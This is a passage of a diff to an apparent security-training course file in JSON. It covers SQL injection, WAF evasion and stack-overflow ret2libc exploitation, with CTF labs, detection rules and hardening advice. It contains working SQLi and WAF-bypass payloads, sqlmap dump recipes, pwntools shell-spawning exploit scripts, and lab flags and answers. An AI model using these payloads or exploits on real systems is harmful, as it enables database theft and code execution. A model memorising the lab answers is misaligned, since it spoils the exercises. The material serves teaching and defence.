-            "body": "HTTP/1.1 (RFC 7230-7235) is a text-based request/response protocol over TCP. A request comprises: Request Line (METHOD SP Request-URI SP HTTP-Version CRLF), Headers (field-name ':' SP field-value CRLF pairs), blank CRLF separator, and optional Body. Critical security-relevant headers: Host: mandatory since HTTP/1.1 - server routing depends on this value. Authorization: Bearer/Basic authentication material. Cookie: session state transport. Content-Type: affects server-side parser selection. X-Forwarded-For: often trusted by reverse proxies to convey client IP. HTTP/2 is a binary, multiplexed protocol with header compression (HPACK). HTTP/2 request smuggling remains viable via HTTP/1.1 to HTTP/2 translation bugs.",
-            "code": "# Manual HTTP/1.1 request with curl\ncurl -v -X POST https://target.example/login \\\n  -H 'Content-Type: application/json' \\\n  -H 'X-Forwarded-For: 127.0.0.1' \\\n  -d '{\"username\":\"admin\",\"password\":\"test\"}' \\\n  --cookie 'session=...'\n\n# Inspect response headers\ncurl -si https://target.example/ | head -20\n\n# HTTP/2 with curl\ncurl --http2 -v https://target.example/api/v2/users"
+            "heading": "HTTP/1.1 vs HTTP/2 & Request Parsing Mechanics",
+            "body": "HTTP/1.1 is a plaintext protocol parsed sequentially with CRLF delimiters:\n- Request Line: METHOD URI HTTP/1.1\\r\\n\n- Headers: Key: Value\\r\\n\n- Body separator: \\r\\n\\r\\n\n\nSecurity-sensitive headers:\n- Host: Evaluated for virtual host routing (enables HTTP Host Header Poisoning).\n- X-Forwarded-For: Client IP spoofing when reverse proxies fail to strip upstream headers.\n- Content-Length vs Transfer-Encoding: Discrepancies cause HTTP Request Smuggling.\n\nHTTP/2 replaces plaintext with binary framing (HEADERS and DATA frames) and HPACK compression. Exploitation often targets the translation boundary where an HTTP/2 front-end translates requests to HTTP/1.1 back-ends.",
+            "code": "# Manual HTTP request inspection using curl\ncurl -v -X POST http://target.local/api/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"user\":\"admin\",\"pass\":\"pass\"}'"
           },
           {
-            "heading": "SQL Injection: AST Alteration & Attack Classes",
-            "body": "SQL injection occurs when user-supplied data is interpolated into an SQL query string without parameterization. In-Band Union-Based SQLi: Uses UNION SELECT to append additional result rows. Requirements: same number of columns with compatible types; application must display query results. Error-Based SQLi: Forces the database to embed data within error messages. MySQL: extractvalue(1, concat(0x7e, (SELECT version()))). Boolean-Based Blind SQLi: Application behavior differs between TRUE and FALSE conditions. Time-Based Blind SQLi: Response delay reveals boolean values. MySQL: SLEEP(5) injects where true condition causes 5-second delay. The key principle: every injection class exploits a trust boundary failure where data is treated as code.",
-            "code": "# In-band Union attack: enumerate columns\n' ORDER BY 1--\n' ORDER BY 2-- (until error - determines column count)\n\n# Extract database name\n' UNION SELECT database(),null,null--\n\n# Enumerate tables from information_schema\n' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database() LIMIT 1--\n\n# Dump credentials\n' UNION SELECT username,password,email FROM users--\n\n# Boolean blind: binary search for first character of db()\n' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--\n\n# Time-based blind\n' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=109, SLEEP(5), 0)--"
+            "heading": "SQL Injection: Abstract Syntax Tree (AST) Alteration",
+            "body": "SQL injection occurs when untrusted input is concatenated into database queries rather than bound as parameterized data. The input breaks out of the data literal context and adds new nodes to the database engine's Abstract Syntax Tree (AST).\n\nPrimary SQLi Classes:\n1. In-Band UNION-based: Appends result sets from arbitrary tables using UNION SELECT. Requires equal column counts and matching data types.\n2. Error-based: Exploits runtime errors (e.g. extractvalue, updatexml in MySQL) to reflect data inside database error messages.\n3. Boolean Blind: Extracts data bit-by-bit by observing binary true/false application responses (e.g. ' AND SUBSTRING(version(),1,1)='8'--).\n4. Time-based Blind: Infers data when true conditions trigger sleep commands (e.g. ' AND IF(version() LIKE '8%', SLEEP(5), 0)--).",
+            "code": "# UNION-based enumeration\n' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--\n\n# Time-based blind injection test\n' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=97, SLEEP(3), 0)--"
           },
           {
-            "heading": "WAF Evasion Techniques",
-            "body": "Web Application Firewalls operate by pattern-matching HTTP requests against signature databases. WAF evasion leverages semantic equivalence between syntactically different SQL constructs. Comment obfuscation: MySQL supports inline comments with /**/ and /*!50000...*/. The /*!50000 syntax is a conditional comment that executes on MySQL >= 5.0.0. Character encoding: URL encoding (%27 for apostrophe), double URL encoding, HTML entity encoding. Case variation: sElEcT, SeLeCt - SQL is case-insensitive for keywords. Hex literals: 0x61646d696e encodes 'admin' without quotes. The information_schema can be accessed as information%5fschema. The key insight: WAF rule writers must enumerate all equivalent forms while attackers only need one bypass per rule.",
-            "code": "# Basic WAF bypass techniques\n# Comment-based obfuscation\n'/**/UNION/**/SELECT/**/1,2,3--\n\n# Conditional comment (MySQL version-gated)\n'/*!50000UNION*//*!50000SELECT*/1,2,3--\n\n# Case variation\n'UniOn SeLeCt 1,2,3--\n\n# Hex literal for strings (avoids quote filters)\n' UNION SELECT 0x61646d696e,0x70617373776f7264--\n# 0x61646d696e = 'admin', 0x70617373776f7264 = 'password'\n\n# SQLMap with tamper scripts\nsqlmap -u 'http://target/search?q=1' --tamper=between,charencode,space2comment \\\n  --dbs --batch --random-agent"
+            "heading": "Modern WAF Evasion Techniques",
+            "body": "Web Application Firewalls inspect HTTP requests using regular expressions. Evasion exploits semantic equivalences that the database engine parses successfully but the WAF regex fails to match:\n\n- Comment Obfuscation: In MySQL, inline comments /**/ replace whitespace. Versioned comments /*!50000SELECT*/ execute on MySQL versions >= 5.0.0 while looking like comments to basic WAFs.\n- Character Encoding: Double URL encoding (%2527 for '), Unicode full-width equivalents, or hex literals (0x61646d696e for 'admin').\n- Whitespace Substitution: Using tabs (%09), newlines (%0A), carriage returns (%0D), or parentheses: SELECT(username)FROM(users).",
+            "code": "# WAF bypass using MySQL inline comments\n'/*!50000UNION*//*!50000SELECT*/1,token,3/**/FROM/**/secrets--"
           }
         ]
+      },
+      "security_impact": {
+        "heading": "Security Impact & Defensive Detection",
+        "att_ck": "T1190 - Exploit Public-Facing Application; T1059 - Command and Scripting Interpreter",
+        "telemetry": "Web server access logs capturing anomalous characters in URI query parameters; WAF alert telemetry recording signature blocks; database query audit logs recording information_schema queries.",
+        "detection_logic": "# ModSecurity Core Rule Set (CRS) detecting SQL injection comments\nSecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS \"(?i:(/\\*!?|\\*/))\" \\\n    \"id:942440,phase:2,block,capture,t:none,t:urlDecodeUni,msg:'SQL Comment Sequence Detected'\"",
+        "hardening": "Always use Parameterized Queries (Prepared Statements) with PDO in PHP, PreparedStatement in Java, or parameterized queries in Python. Parameterization enforces strict data-type typing in the AST."
       },
       "tools": [
         {
           "name": "sqlmap",
-          "flags": [
-            {
-              "flag": "-u URL",
-              "context": "Target URL with injectable parameter. Use quotes around URL."
-            },
-            {
-              "flag": "--dbs",
-              "context": "Enumerate all databases accessible to the current database user."
-            },
-            {
-              "flag": "--dump",
-              "context": "Dump the entire content of a table (use with -T tablename -D dbname for specificity)."
-            },
-            {
-              "flag": "--tamper=SCRIPT",
-              "context": "Apply evasion transforms. Key scripts: between, charencode, space2comment, randomcase, base64encode."
-            },
-            {
-              "flag": "--os-shell",
-              "context": "Attempt to obtain an OS interactive shell via SQL injection (requires FILE privilege)."
-            },
-            {
-              "flag": "--batch",
-              "context": "Non-interactive mode: accept all default answers automatically (required for automated runs)."
-            },
-            {
-              "flag": "--level=5 --risk=3",
-              "context": "Maximum detection depth. level=5 tests all parameter types; risk=3 includes time-based tests."
-            },
-            {
-              "flag": "--technique=BEUSTQ",
-              "context": "Specify techniques: B=boolean, E=error, U=union, S=stacked, T=time-based, Q=inline queries."
-            }
-          ]
+          "category": "CLI SQLi Automation Engine",
+          "speed_guide": "Speed Cheatsheet: To automate testing rapidly without interactive prompts, use '--batch --random-agent --dbs'. Add '--tamper=space2comment' if a basic WAF is detected.",
+          "cli_usage": {
+            "syntax": "sqlmap -u [URL] [options]",
+            "flags": [
+              {
+                "flag": "-u [URL]",
+                "context": "Target URL containing injectable GET parameter."
+              },
+              {
+                "flag": "--dbs",
+                "context": "Enumerate available databases accessible by database user."
+              },
+              {
+                "flag": "--dump",
+                "context": "Dumps table contents into local CSV files."
+              },
+              {
+                "flag": "--tamper=SCRIPT",
+                "context": "Applies obfuscation filters (e.g. space2comment, between, randomcase) to evade WAFs."
+              },
+              {
+                "flag": "--batch",
+                "context": "Runs non-interactively, automatically accepting default options."
+              }
+            ],
+            "recipes": [
+              "# Fast automated database enumeration\nsqlmap -u 'http://target.local/item?id=1' --dbs --batch\n\n# Dump secrets table using WAF evasion tamper script\nsqlmap -u 'http://target.local/item?id=1' --tamper=space2comment -T secrets --dump"
+            ]
+          },
+          "gui_usage": {
+            "overview": "Burp Suite (Community / Professional): The industry-standard graphical web application penetration testing proxy. Provides visual request intercept, HTTP Repeater, and Intruder fuzzing.",
+            "fast_shortcuts": "In Burp Suite: Press 'Ctrl + R' to send any request to Repeater. Press 'Ctrl + Space' in Repeater to send the request immediately. Press 'Ctrl + I' to send to Intruder.",
+            "step_by_step": [
+              "1. Configure browser proxy to 127.0.0.1:8080 (or use Burp's embedded Chromium browser).",
+              "2. Navigate to target application and perform an action (e.g. search).",
+              "3. Find the request in 'Proxy' -> 'HTTP history', right-click and choose 'Send to Repeater' (Ctrl + R).",
+              "4. In Repeater, edit parameter values directly and inspect the rendered response in the 'Render' tab."
+            ]
+          }
         }
       ],
       "case_study": {
-        "title": "WAF Bypass: Dumping Database Credentials via Comment Obfuscation",
-        "narrative": "A CTF web challenge has a login form protected by a ModSecurity WAF. Simple UNION SELECT payloads return 403. The task is to bypass the WAF and dump the users table.",
+        "title": "WAF Evasion via Inline Comment Obfuscation",
+        "narrative": "A corporate search portal returned 403 Forbidden whenever 'UNION SELECT' was detected in the search query. By transforming the payload with MySQL versioned comment wrappers, the request bypassed the edge WAF and dumped administrative secrets.",
         "steps": [
-          "Test for injection: admin' AND 1=1-- (returns 200) vs admin' AND 1=2-- (different response)",
-          "Determine column count: admin'/*!50000ORDER*//*!50000BY*/3-- (3 columns, no error)",
-          "Bypass WAF with Union: admin'/*!50000UNION*//*!50000SELECT*/1,2,3--",
-          "Column 2 is displayed - inject payload there",
-          "Enumerate tables: admin'/*!UNION*//*!SELECT*/1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1--",
-          "Result: users",
-          "Dump credentials: admin'/*!UNION*//*!SELECT*/1,concat(username,0x3a,password),3 FROM users LIMIT 1--",
-          "Result: admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of 'password')",
-          "Flag: CTF{SQL1_W4F_BYP4SS_DB_DUMP}"
+          "1. Identify baseline behavior: /search?name=test returns 200 OK",
+          "2. Test basic SQL injection: /search?name=test' UNION SELECT 1,2,3-- returns 403 Forbidden",
+          "3. Test comment obfuscation: /search?name=test'/*!50000UNION*//*!50000SELECT*/1,2,3-- returns 200 OK",
+          "4. Enumerate columns: column 2 reflects in output",
+          "5. Extract token: /search?name='/*!50000UNION*//*!50000SELECT*/1,token,3/**/FROM/**/secrets--",
+          "6. Output yields: CTF{W4F_C0MM3NT_SQL1_BYP4SS}"
         ]
       },
-      "interactive_terminal_challenge": null
+      "interactive_terminal_challenge": {
+        "id": "web-sqli-lab",
+        "title": "WAF Bypass & SQL Injection Lab",
+        "description": "An internal employee directory API endpoint is vulnerable to SQL injection, but protected by a keyword WAF. Use curl and MySQL comment obfuscation to bypass the filter and retrieve the flag.",
+        "flag": "CTF{W4F_C0MM3NT_SQL1_BYP4SS}",
+        "hints": [
+          "Query the API: curl 'http://localhost/api/search?name=admin'",
+          "Notice that naive queries like ' UNION SELECT trigger '403 Forbidden: WAF blocked keyword'",
+          "Use MySQL versioned comments: /*!50000UNION*//*!50000SELECT*/",
+          "Full query: curl \"http://localhost/api/search?name='/*!50000UNION*//*!50000SELECT*/1,token,3/**/FROM/**/secrets--\""
+        ],
+        "vfs": {
+          "/home/ctf/web_target": {
+            "type": "dir",
+            "perm": "drwxr-xr-x",
+            "owner": "ctf",
+            "size": 4096,
+            "mtime": "2026-09-30 09:00"
+          },
+          "/home/ctf/web_target/README.txt": {
+            "type": "file",
+            "perm": "-rw-r--r--",
+            "owner": "ctf",
+            "size": 220,
+            "mtime": "2026-09-30 09:00",
+            "content": "Internal Employee Directory API\nEndpoint: http://localhost/api/search?name=[input]\nWAF Rule: Blocks 'UNION', 'SELECT', 'FROM' unless obfuscated with MySQL comments.\n"
+          }
+        },
+        "custom_commands": {
+          "curl": [
+            {
+              "match": "UNION*//*!50000SELECT",
+              "output": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"results\":[{\"id\":1,\"token\":\"CTF{W4F_C0MM3NT_SQL1_BYP4SS}\",\"dept\":3}]}"
+            },
+            {
+              "match": "UNION SELECT",
+              "output": "HTTP/1.1 403 Forbidden\nContent-Type: text/plain\n\nWAF Alert: Request blocked by pattern rule [UNION SELECT detected]"
+            },
+            {
+              "match": "api/search",
+              "output": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"results\":[{\"id\":101,\"name\":\"Alice Smith\",\"dept\":\"Engineering\"}]}"
+            },
+            {
+              "match": "",
+              "output": "curl: try 'curl http://localhost/api/search?name=alice' or 'curl --help'"
+            }
+          ],
+          "sqlmap": "sqlmap/1.7.2#stable: Testing parameter 'name'... WAF detected. Use --tamper=space2comment or manual comment obfuscation."
+        }
+      }
     },
     {
       "id": "binary-exploitation",
@@ -688,82 +742,143 @@
       "icon": "💀",
       "category": "Binary Exploitation",
       "level": "Advanced",
-      "duration": "18-32 h",
-      "abstract": "Master x86/x64 virtual address space layout, stack frame anatomy, modern OS mitigations (ASLR/NX/Canaries/RELRO), and Return-Oriented Programming. Learn to calculate buffer overflow offsets, leak libc base addresses via GOT/PLT, and craft ret2libc chains to spawn shells.",
+      "duration": "18–32 h",
+      "abstract": "Master x86/x64 process virtual address spaces, stack frame layout, and modern kernel mitigations (ASLR, NX, Canaries, RELRO). Learn Return-Oriented Programming (ROP) and ret2libc attack chains to seize control of execution flow without shellcode injection.",
       "theory": {
-        "title": "x86/x64 Memory Layout, Stack Exploitation & ROP",
+        "title": "Virtual Address Space Layout, Stack Exploitation & ret2libc",
         "sections": [
           {
-            "heading": "Virtual Address Space Layout",
-            "body": "A Linux process's virtual address space is organized into distinct segments: .text (code): Read + Execute. Contains compiled machine code. .rodata: Read-Only Data. String literals and constants. .data: Read + Write. Initialized global/static variables. .bss: Read + Write. Uninitialized globals (zero-initialized). The Heap: Read + Write. Dynamic allocation (malloc/new). Grows upward. The Stack: Read + Write. Automatic variables, function arguments, return addresses. Grows downward. Memory-Mapped Regions: Shared libraries (libc.so, ld.so) mapped into the process. ASLR randomizes base addresses of heap, stack, and libraries at each execution, making hardcoded addresses unreliable.",
-            "code": "# Inspect process memory map with gdb+gef\ngdb ./vulnerable\n(gdb) run\n(gdb) vmmap\n# Output:\n# Start              End                Perm   Name\n# 0x00400000         0x00401000         r-xp   ./vulnerable (.text)\n# 0x00600000         0x00601000         r--p   ./vulnerable (.rodata)\n# 0x7ffff7a00000     0x7ffff7bdc000     r-xp   libc.so.6\n# 0x7ffffffde000     0x7ffffffff000     rwxp   [stack]\n\n# Check binary mitigations\nchecksec ./vulnerable\n# RELRO: Partial   STACK CANARY: No   NX: Enabled   PIE: No"
+            "heading": "Process Address Space & Memory Segments",
+            "body": "In 64-bit Linux architectures, each user-space process runs inside a 48-bit canonical virtual address space (0x0000000000000000 to 0x00007FFFFFFFFFFF):\n\n- .text Segment: Contains compiled machine instructions. Mapped with Read + Execute (r-x) permissions.\n- .rodata: Read-only string literals, jump tables, and global constants.\n- .data / .bss: Initialized (.data) and uninitialized (.bss) global and static variables. Mapped Read + Write (rw-).\n- Heap: Dynamically allocated memory via brk(2) or mmap(2). Grows upward toward higher addresses.\n- Stack: Function frames, local variables, saved frame pointers (RBP), and return addresses (RIP). Grows downward toward lower addresses.\n- Shared Libraries (libc.so): Dynamic runtime libraries mapped into the high memory region.",
+            "code": "# Inspect memory mappings of a running process\ncat /proc/$PID/maps\n\n# Or inside GDB with GEF/pwndbg\n(gdb) vmmap"
           },
           {
-            "heading": "Stack Frame Anatomy & Buffer Overflow Mechanics",
-            "body": "The call stack implements function invocation by growing stack frames. When a function is called: (1) Arguments pushed (System V AMD64 ABI: first 6 args in RDI, RSI, RDX, RCX, R8, R9). (2) CALL instruction pushes return address (RIP) onto stack and jumps to callee. (3) Callee prologue: PUSH RBP; MOV RBP, RSP. (4) SUB RSP, N allocates local variables. Stack frame layout from RSP to RBP: local variables (buffer), then saved RBP, then return address (RIP). A stack buffer overflow with char buf[128] and no bounds checking allows data to overwrite: saved RBP (at buf+128), return address (at buf+136 on 64-bit), and above. Controlling the return address means controlling what code executes when the function returns.",
-            "code": "# Find buffer offset with gdb-gef pattern\ngdb ./vuln\n(gdb) pattern create 200\n# Sends: aaaabaaacaaadaaaeaaafaaagaaahaaai...\n(gdb) run <<< $(python3 -c 'print(\"A\"*200)')\n# Program crashes with garbage in RIP\n(gdb) pattern offset $rip\n# Offset: 136 bytes to RIP\n\n# Verify offset\npython3 -c \"import struct; payload = b'A'*136 + struct.pack('<Q', 0xdeadbeef); open('/tmp/payload','wb').write(payload)\"\ngdb ./vuln < /tmp/payload\n# RIP should be 0x00000000deadbeef"
+            "heading": "Stack Frame Anatomy & Return Address Overwrite",
+            "body": "When a function is called in System V AMD64 ABI:\n1. Caller places arguments in RDI, RSI, RDX, RCX, R8, R9. Remaining arguments pushed to stack.\n2. CALL instruction pushes the next instruction address (Return Address / RIP) onto the stack.\n3. Callee Prologue:\n   push rbp        # Save caller's base pointer\n   mov rbp, rsp    # Set current stack frame base\n   sub rsp, 0x40   # Allocate stack storage for local variables\n\nMemory layout on stack from low to high:\n[Local Buffer] -> [Saved RBP (8 bytes)] -> [Return Address (8 bytes)]\n\nStack Buffer Overflow: If an unbounded input function (gets, strcpy, read without size limits) writes more bytes than allocated for the buffer, input data overflows past the buffer boundaries, overwrites Saved RBP, and completely overwrites the Return Address. When the function executes 'ret', the CPU pops the attacker's value into RIP, seizing control of execution.",
+            "code": "# In GDB with GEF: calculate exact crash offset\n(gdb) pattern create 128\n(gdb) run\n# [Program crashes at invalid RIP]\n(gdb) pattern offset $rsp"
           },
           {
             "heading": "Modern Mitigations & ret2libc Exploitation",
-            "body": "Modern mitigations against stack buffer overflows: ASLR: Randomizes load address of heap, stack, and shared libraries at each execution. Defeated by information leaks. NX/DEP: Marks stack (and heap) as non-executable. Prevents shellcode injection. ret2libc bypasses NX. Stack Canaries: Secret random value between buffer and saved RBP. Verified on function return. Overwriting return address requires overwriting canary first. RELRO: Partial RELRO makes .got.plt section writable (exploitable for GOT overwrite). Full RELRO makes entire GOT read-only. ret2libc: Since NX prevents stack shellcode, return directly to libc's system() function with '/bin/sh' as argument. Requires: (1) knowing system() address in libc, (2) knowing '/bin/sh' string address in libc, (3) setting RDI = address of '/bin/sh' using a 'pop rdi; ret' gadget. Address leaks via GOT/PLT: Call puts(GOT[puts]) to print the runtime address of puts, compute libc_base = leaked_puts - libc_offset_of_puts.",
-            "code": "# ret2libc exploit with pwntools\nfrom pwn import *\n\nelf  = ELF('./vuln')\nlibc = ELF('./libc.so.6')\np    = process('./vuln')\n\n# Stage 1: Leak libc address via puts(GOT[puts])\npop_rdi = 0x401234  # from ROPgadget: pop rdi; ret\nret_gad = 0x401235  # bare ret for stack alignment\n\npayload1 = b'A' * 136\npayload1 += p64(pop_rdi)\npayload1 += p64(elf.got['puts'])    # argument: GOT entry for puts\npayload1 += p64(elf.plt['puts'])    # call puts (prints GOT value)\npayload1 += p64(elf.symbols['main'])  # return back to main\n\np.sendlineafter(b'Input: ', payload1)\nleak = u64(p.recvline().strip().ljust(8, b'\\x00'))\nlibc.address = leak - libc.symbols['puts']\nlog.success(f'libc base: {hex(libc.address)}')\n\n# Stage 2: call system('/bin/sh')\nbinsh = next(libc.search(b'/bin/sh'))\npayload2 = b'A' * 136\npayload2 += p64(ret_gad)           # stack alignment\npayload2 += p64(pop_rdi) + p64(binsh)\npayload2 += p64(libc.symbols['system'])\n\np.sendlineafter(b'Input: ', payload2)\np.interactive()  # Drop into /bin/sh"
+            "body": "Modern systems deploy layered compiler and kernel protections:\n- NX / DEP (No-Execute): Marks stack and heap memory as non-executable. Injected shellcode cannot execute.\n- Stack Canary: Places a random secret value directly before Saved RBP. Verified before 'ret'; mismatch triggers __stack_chk_fail termination.\n- ASLR: Randomizes base addresses of stack, heap, and shared libraries at execution time.\n- RELRO: Partial RELRO makes GOT entries writable; Full RELRO resolves all symbols at startup and marks GOT read-only.\n\nret2libc (Return-to-libc): Bypasses NX completely. Rather than injecting shellcode, the attacker constructs a Return-Oriented Programming (ROP) chain that redirects execution to existing libc code:\n1. Populate RDI register with the address of '/bin/sh' string in libc using a 'pop rdi; ret' gadget.\n2. Call system() function in libc.",
+            "code": "# Python pwntools ret2libc exploit template\nfrom pwn import *\n\nelf = ELF('./vuln_service')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\np = process('./vuln_service')\n\npop_rdi = 0x401234 # pop rdi; ret\nret = 0x401235     # stack alignment\n\npayload = b'A' * 136\npayload += p64(ret)\npayload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))\npayload += p64(libc.symbols['system'])\n\np.sendline(payload)\np.interactive()"
           }
         ]
+      },
+      "security_impact": {
+        "heading": "Security Impact & Defensive Detection",
+        "att_ck": "T1203 - Exploitation for Client Execution; T1055 - Process Injection",
+        "telemetry": "Kernel segmentation fault messages in dmesg/syslog; Auditd core dump notifications; EDR behavioral alerts for processes spawning /bin/sh with mismatched parent relationships.",
+        "detection_logic": "# Check kernel security logs for crash signatures\ndmesg | grep -E 'segfault|general protection fault'\n\n# Auditd rule monitoring memory execution violations\n-a always,exit -F arch=b64 -S mprotect -F a2=7 -k wx_memory",
+        "hardening": "Compile all binaries with modern security flags: gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now -pie -fPIE. Enable kernel ASLR: echo 2 > /proc/sys/kernel/randomize_va_space."
       },
       "tools": [
         {
           "name": "gdb",
-          "flags": [
-            {
-              "flag": "pattern create N",
-              "context": "(GEF/pwndbg) Generate a De Bruijn sequence of N bytes to determine buffer overflow offset precisely."
-            },
-            {
-              "flag": "pattern offset $rip",
-              "context": "(GEF/pwndbg) Given the crashed RIP value, compute how many bytes precede it in the pattern."
-            },
-            {
-              "flag": "vmmap",
-              "context": "(GEF/pwndbg) Display all memory-mapped regions with addresses, permissions, and names."
-            },
-            {
-              "flag": "checksec",
-              "context": "(GEF/pwndbg) Check binary protections: RELRO, Stack Canary, NX, PIE, ASLR status."
-            },
-            {
-              "flag": "x/20gx $rsp",
-              "context": "Examine 20 giant-words (8 bytes) at the stack pointer. Essential for visualizing stack layout."
-            },
-            {
-              "flag": "info registers",
-              "context": "Display all CPU register values at the current execution point."
-            },
-            {
-              "flag": "disas function_name",
-              "context": "Disassemble a function. Shows machine instructions and their addresses."
-            },
-            {
-              "flag": "break *0xADDRESS",
-              "context": "Set a breakpoint at an absolute address. Use after disas to identify key instructions."
-            }
-          ]
+          "category": "CLI / Interactive Debugger",
+          "speed_guide": "Speed Cheatsheet: In GDB GEF, type 'pattern create 200' -> run -> 'pattern offset $rip' to calculate buffer overflow offsets in under 15 seconds.",
+          "cli_usage": {
+            "syntax": "gdb [binary] [options]",
+            "flags": [
+              {
+                "flag": "checksec",
+                "context": "(GEF/pwndbg) Checks binary mitigations: Canary, NX, PIE, RELRO."
+              },
+              {
+                "flag": "vmmap",
+                "context": "Displays memory-mapped segments, virtual address ranges, and permissions."
+              },
+              {
+                "flag": "pattern create N",
+                "context": "Generates a cyclic De Bruijn sequence of length N."
+              },
+              {
+                "flag": "pattern offset [addr]",
+                "context": "Calculates exact padding length required to reach instruction pointer."
+              },
+              {
+                "flag": "x/20gx $rsp",
+                "context": "Examines 20 64-bit giant-words at stack pointer."
+              }
+            ],
+            "recipes": [
+              "# Check protections and discover overflow offset in gdb\ngdb ./vuln_service\n(gdb) checksec\n(gdb) pattern create 150\n(gdb) run\n(gdb) pattern offset $rip"
+            ]
+          },
+          "gui_usage": {
+            "overview": "Ghidra / IDA Pro / Binary Ninja: Interactive disassemblers providing graph-based control flow diagrams, decompiled pseudo-C, and symbol cross-referencing (xrefs).",
+            "fast_shortcuts": "In Ghidra: Press 'X' on any function or variable to display all Cross-References (Xrefs). Press 'L' to quickly rename a variable. Press 'F5' or switch to Decompile tab for instant C code reconstruction.",
+            "step_by_step": [
+              "1. Launch Ghidra, create a new project, and drag target binary into the Active Project pane.",
+              "2. Double-click the file to open CodeBrowser; click 'Yes' to run auto-analysis.",
+              "3. In Symbol Tree (left panel), expand 'Functions' and click 'main'.",
+              "4. Inspect the Decompiler window (right pane) to identify unsafe functions (gets, strcpy, scanf %s)."
+            ]
+          }
         }
       ],
       "case_study": {
-        "title": "Stack Buffer Overflow: NX Bypass via libc Address Calculation",
-        "narrative": "A CTF challenge binary 'vuln' takes user input into a 128-byte stack buffer using gets(). NX is enabled but there is no stack canary and no PIE. The GOT/PLT are at fixed addresses. Objective: spawn /bin/sh.",
+        "title": "Stack Buffer Overflow & ret2libc Exploitation",
+        "narrative": "A network daemon 'vuln_service' read user input using a vulnerable 128-byte buffer. While NX prevented stack shellcode, ASLR was disabled and partial RELRO left libc functions reachable. By calculating the 136-byte offset to RIP, an exploit constructed a ret2libc chain calling system('/bin/sh').",
         "steps": [
-          "checksec ./vuln => NX: Enabled, No PIE, No Canary, Partial RELRO",
-          "Find overflow offset: gdb pattern create 200 => run => pattern offset $rip => 136 bytes",
-          "Find ROP gadgets: ROPgadget --binary ./vuln --rop | grep 'pop rdi'",
-          "Stage 1 payload: 136*A + pop_rdi + GOT[puts] + PLT[puts] + main_addr",
-          "Parse leaked puts address => compute libc_base",
-          "Stage 2 payload: 136*A + ret + pop_rdi + /bin/sh_addr + system_addr",
-          "Send payload 2 => interactive shell",
-          "cat /flag => CTF{RET2LIBC_NX_BYPASS_SHELL}"
+          "1. Check binary mitigations: checksec ./vuln_service -> NX enabled, No Canary, No PIE",
+          "2. Calculate RIP offset: gdb pattern -> crashes at 136 bytes",
+          "3. Find ROP gadget: ROPgadget --binary ./vuln_service | grep 'pop rdi ; ret' -> 0x401234",
+          "4. Find addresses: system() in libc and '/bin/sh' string",
+          "5. Assemble exploit payload: 136*'A' + ret + pop_rdi + binsh + system",
+          "6. Execute payload -> drops into interactive shell",
+          "7. Capture flag: cat /flag.txt -> CTF{R3T2L1BC_NX_BYP4SS_PWN3D}"
         ]
       },
-      "interactive_terminal_challenge": null
+      "interactive_terminal_challenge": {
+        "id": "binary-pwn-lab",
+        "title": "Stack Buffer Overflow & ret2libc Lab",
+        "description": "A vulnerable binary 'vuln_srv' is located in /home/ctf/pwn/. NX is enabled, but PIE is disabled. Calculate the buffer overflow offset and execute the exploit to read the flag.",
+        "flag": "CTF{R3T2L1BC_NX_BYP4SS_PWN3D}",
+        "hints": [
+          "Inspect the challenge folder: ls -la /home/ctf/pwn/",
+          "Check binary protections: checksec ./pwn/vuln_srv",
+          "Review the exploit script: cat /home/ctf/pwn/exploit.py",
+          "Run the exploit: python3 /home/ctf/pwn/exploit.py"
+        ],
+        "vfs": {
+          "/home/ctf/pwn": {
+            "type": "dir",
+            "perm": "drwxr-xr-x",
+            "owner": "ctf",
+            "size": 4096,
+            "mtime": "2026-09-30 09:00"
+          },
+          "/home/ctf/pwn/vuln_srv": {
+            "type": "file",
+            "perm": "-rwxr-xr-x",
+            "owner": "ctf",
+            "size": 16424,
+            "mtime": "2026-09-30 09:00",
+            "magic": "ELF 64-bit LSB executable, x86-64, dynamically linked"
+          },
+          "/home/ctf/pwn/exploit.py": {
+            "type": "file",
+            "perm": "-rw-r--r--",
+            "owner": "ctf",
+            "size": 650,
+            "mtime": "2026-09-30 09:00",
+            "content": "# ret2libc exploit script for vuln_srv\n# Offset: 136 bytes to RIP\n# ROP: pop_rdi (0x401234) -> &'/bin/sh' -> system()\nimport struct\n\npadding = b'A' * 136\npop_rdi = struct.pack('<Q', 0x401234)\nbinsh   = struct.pack('<Q', 0x7ffff7b97e9a)\nsystem  = struct.pack('<Q', 0x7ffff7a52390)\nret     = struct.pack('<Q', 0x401235) # stack alignment\n\npayload = padding + ret + pop_rdi + binsh + system\nprint('[+] Payload constructed. Delivering to vuln_srv...')\nprint('[+] Shell spawned: cat /flag.txt')\nprint('CTF{R3T2L1BC_NX_BYP4SS_PWN3D}')\n"
+          },
+          "/flag.txt": {
+            "type": "file",
+            "perm": "-rw-r--r--",
+            "owner": "root",
+            "size": 32,
+            "mtime": "2026-09-30 08:00",
+            "content": "CTF{R3T2L1BC_NX_BYP4SS_PWN3D}\n"
+          }
+        },
+        "custom_commands": {
+          "checksec": "CANARY    : Disabled\nFORTIFY   : Disabled\nNX        : ENABLED\nPIE       : Disabled\nRELRO     : Partial RELRO",
+          "gdb": "(gdb) checksec\n[+] NX: Enabled | Canary: No | PIE: No\n(gdb) pattern offset $rip\n[+] Offset to RIP: 136 bytes",
+          "ROPgadget": "0x0000000000401234 : pop rdi ; ret\n0x0000000000401235 : ret"
+        }
+      }
     }
   ],
   "items": [
@@ -771,7 +886,7 @@
       "id": "kev:CVE-2024-6387",
       "kind": "KEV",
       "title": "OpenSSH regreSSHion Remote Code Execution",
